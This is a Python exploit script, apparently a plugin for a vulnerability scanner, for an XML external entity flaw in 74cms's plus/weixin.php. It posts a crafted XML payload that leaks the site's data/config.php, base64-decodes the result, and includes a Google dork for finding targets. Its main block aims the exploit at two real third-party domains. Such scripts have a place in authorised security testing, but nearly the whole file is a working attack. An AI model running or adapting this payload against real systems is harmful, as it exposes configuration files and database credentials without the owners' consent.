#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 74cms任意文件的读取(XML实体注入)
author: yichin
refer: http://wooyun.org/bugs/wooyun-2010-075009
description:
    plus/weixin.php
google dork:
    Powered by 74cms
'''

import base64
import re

def assign(service, arg):
    if service == '74cms':
        return True, arg

def audit(arg):
    url = arg + 'plus/weixin.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709&timestamp=&nonce='
    data = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE copyright [
<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=../data/config.php">
]>
<xml>
<ToUserName>&test;</ToUserName>
<FromUserName>1111</FromUserName>
<Content>2222</Content>
<Event>subscribe</Event>
</xml>'''
    content_type = 'Content-Type: text/xml'
    code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
    if code != 200:
        return False
    m = re.search(r'<FromUserName><!\[CDATA\[([a-zA-Z0-9/+=]*)\]\]>', res)
    if not m:
        return False
    config_file = base64.b64decode(m.group(1))
    if("<?php" in config_file) and ("?>" in config_file):
        security_hole(url + ' >refer:http://wooyun.org/bugs/wooyun-2010-075009')
if __name__ == '__main__':
    from dummy import *
    audit(assign('74cms', 'http://rc.0513.org/')[1])
    audit(assign('74cms', 'http://ql.jiyizp.com/')[1])